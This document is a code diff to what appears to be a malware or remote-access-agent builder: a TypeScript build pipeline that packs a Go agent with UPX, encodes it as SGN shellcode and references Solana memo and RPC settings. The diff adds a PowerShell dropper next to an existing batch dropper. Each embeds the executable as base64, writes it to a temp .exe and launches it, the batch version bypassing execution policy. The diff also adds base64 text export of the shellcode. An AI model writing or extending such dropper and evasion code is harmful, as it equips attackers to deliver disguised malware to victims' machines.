@@ -115,6 +115,7 @@ type BuildProcessConfig = {
   shellcodeConsole?: boolean;
   useSgn?: boolean;
   sgnIterations?: number;
+  outputSgnTxt?: boolean;
   solMemo?: boolean;
   solAddress?: string;
   solRpcEndpoints?: string;
@@ -167,6 +168,9 @@ function guessMimeTypeForUpload(filename: string): string {
     case ".bat":
     case ".cmd":
       return "application/bat";
+    case ".ps1":
+    case ".txt":
+      return "text/plain";
     case ".bin":
       return "application/octet-stream";
     case ".ipa":
@@ -283,6 +287,29 @@ function detectAgentVersion(clientDir: string): string {
   } catch {
     return "unknown";
   }
+}
+
+function writeSgnTextArtifact(
+  sgnPath: string,
+  txtPath: string,
+  platform: string,
+  arch: "amd64" | "386",
+  iterations: number,
+): number {
+  const bytes = fs.readFileSync(sgnPath);
+  const body = [
+    "# SGN encoded shellcode",
+    `platform: ${platform}`,
+    `arch: ${arch}`,
+    `iterations: ${iterations}`,
+    "encoding: base64",
+    `bytes: ${bytes.length}`,
+    "",
+    bytes.toString("base64"),
+    "",
+  ].join("\n");
+  fs.writeFileSync(txtPath, body, "utf8");
+  return fs.statSync(txtPath).size;
 }
 
 export async function startBuildProcess(
@@ -1132,9 +1159,10 @@ func runBoundFiles() {
 
         const filePath = `${outDir}/${outputName}`;
         let finalSize = Bun.file(filePath).size;
-        // For .bat/.cmd: go build writes a PE binary; UPX must run first (it needs PE format),
-        // then after compression we wrap it in a batch script with an embedded base64 payload.
-        const isBatWrapper = os === "windows" && (winExt === ".bat" || winExt === ".cmd");
+        // For script outputs: go build writes a PE binary; UPX must run first (it needs PE format),
+        // then after compression we wrap it in a script with an embedded base64 payload.
+        const isBatchWrapper = os === "windows" && (winExt === ".bat" || winExt === ".cmd");
+        const isPowerShellWrapper = os === "windows" && winExt === ".ps1";
 
         if (upxBin) {
           sendToStream({ type: "output", text: `Compressing ${outputName} with UPX...\n`, level: "info" });
@@ -1164,43 +1192,65 @@ func runBoundFiles() {
           }
         }
 
-        if (isBatWrapper) {
+        if (isBatchWrapper || isPowerShellWrapper) {
           sendToStream({ type: "output", text: `Wrapping PE binary as ${winExt} script...\n`, level: "info" });
           try {
             const exeBytes = fs.readFileSync(filePath);
             const b64 = exeBytes.toString("base64");
-            // Split into 76-char lines so the bat file stays manageable
+            // Split into 76-char lines so the script stays manageable.
             const b64Lines = b64.match(/.{1,76}/g) || [b64];
-            // Random marker generated at build time using the same uuid util already imported
-            const marker = `:OVD_${uuidv4().replace(/-/g, "").substring(0, 16).toUpperCase()}`;
-            // PowerShell payload: reads this script via %_OVD_SELF%, strips the marker+data,
-            // decodes base64 to a temp .exe, launches it, then exits.
-            const psCmd = [
-              `$f=$env:_OVD_SELF;`,
-              `$l=[IO.File]::ReadAllLines($f);`,
-              `$i=0;`,
-              `for($j=0;$j-lt$l.Count;$j++){if($l[$j] -ceq '${marker}'){$i=$j+1;break}};`,
-              `$b=[Convert]::FromBase64String(($l[$i..($l.Count-1)]-join''));`,
-              `$t=[IO.Path]::Combine([IO.Path]::GetTempPath(),[Guid]::NewGuid().ToString()+'.exe');`,
-              `[IO.File]::WriteAllBytes($t,$b);`,
-              `Start-Process $t;`,
-              `exit`,
-            ].join("");
-            const wrapper = [
-              `@echo off`,
-              `setlocal`,
-              `set "_OVD_SELF=%~f0"`,
-              `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "${psCmd}"`,
-              `endlocal`,
-              `exit /b 0`,
-              marker,
-              ...b64Lines,
-            ].join("\r\n") + "\r\n";
+            const markerCore = `OVD_${uuidv4().replace(/-/g, "").substring(0, 16).toUpperCase()}`;
+            let wrapper: string;
+
+            if (isPowerShellWrapper) {
+              const marker = `# ${markerCore}`;
+              wrapper = [
+                `$ErrorActionPreference = 'SilentlyContinue'`,
+                `$f = $PSCommandPath`,
+                `if (-not $f) { $f = $MyInvocation.MyCommand.Path }`,
+                `$l = [IO.File]::ReadAllLines($f)`,
+                `$i = -1`,
+                `for ($j = 0; $j -lt $l.Count; $j++) { if ($l[$j] -ceq '${marker}') { $i = $j + 1; break } }`,
+                `if ($i -lt 0) { exit 1 }`,
+                `$b = [Convert]::FromBase64String(($l[$i..($l.Count - 1)] -join ''))`,
+                `$t = [IO.Path]::Combine([IO.Path]::GetTempPath(), ([Guid]::NewGuid().ToString() + '.exe'))`,
+                `[IO.File]::WriteAllBytes($t, $b)`,
+                `Start-Process -FilePath $t`,
+                `exit 0`,
+                marker,
+                ...b64Lines,
+              ].join("\r\n") + "\r\n";
+            } else {
+              const marker = `:${markerCore}`;
+              // PowerShell payload: reads this script via %_OVD_SELF%, strips the marker+data,
+              // decodes base64 to a temp .exe, launches it, then exits.
+              const psCmd = [
+                `$f=$env:_OVD_SELF;`,
+                `$l=[IO.File]::ReadAllLines($f);`,
+                `$i=0;`,
+                `for($j=0;$j-lt$l.Count;$j++){if($l[$j] -ceq '${marker}'){$i=$j+1;break}};`,
+                `$b=[Convert]::FromBase64String(($l[$i..($l.Count-1)]-join''));`,
+                `$t=[IO.Path]::Combine([IO.Path]::GetTempPath(),[Guid]::NewGuid().ToString()+'.exe');`,
+                `[IO.File]::WriteAllBytes($t,$b);`,
+                `Start-Process $t;`,
+                `exit`,
+              ].join("");
+              wrapper = [
+                `@echo off`,
+                `setlocal`,
+                `set "_OVD_SELF=%~f0"`,
+                `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "${psCmd}"`,
+                `endlocal`,
+                `exit /b 0`,
+                marker,
+                ...b64Lines,
+              ].join("\r\n") + "\r\n";
+            }
             fs.writeFileSync(filePath, wrapper, "utf8");
             finalSize = fs.statSync(filePath).size;
             sendToStream({ type: "output", text: `Wrapped: ${exeBytes.length} byte PE → ${finalSize} byte ${winExt} script\n`, level: "info" });
           } catch (wrapErr: any) {
-            sendToStream({ type: "output", text: `WARNING: Failed to generate bat wrapper: ${wrapErr.message || wrapErr}. Output is a raw PE binary with ${winExt} extension.\n`, level: "warn" });
+            sendToStream({ type: "output", text: `WARNING: Failed to generate ${winExt} wrapper: ${wrapErr.message || wrapErr}. Output is a raw PE binary with ${winExt} extension.\n`, level: "warn" });
           }
         }
 
@@ -1376,6 +1426,18 @@ func runBoundFiles() {
           finalOutputSize = Bun.file(sgnOutputPath).size;
           shellcodeBinPath = sgnOutputPath;
           sendToStream({ type: "output", text: `SGN-encoded shellcode: ${finalOutputSize} bytes → ${finalOutputName}\n`, level: "success" });
+
+          if (config.outputSgnTxt) {
+            sendToStream({ type: "status", text: `Writing ${platform} SGN output as TXT…` });
+            const txtOutputName = deps.sanitizeOutputName(`${finalOutputName}.txt`);
+            const txtOutputPath = path.join(outDir, txtOutputName);
+            const txtSize = writeSgnTextArtifact(sgnOutputPath, txtOutputPath, platform, shellcodeArch, iters);
+            try { fs.unlinkSync(sgnOutputPath); } catch {}
+            finalOutputName = txtOutputName;
+            finalOutputSize = txtSize;
+            shellcodeBinPath = txtOutputPath;
+            sendToStream({ type: "output", text: `SGN TXT ready: ${txtSize} bytes → ${finalOutputName}\n`, level: "success" });
+          }
         }
 
         (build.files as any[]).push({
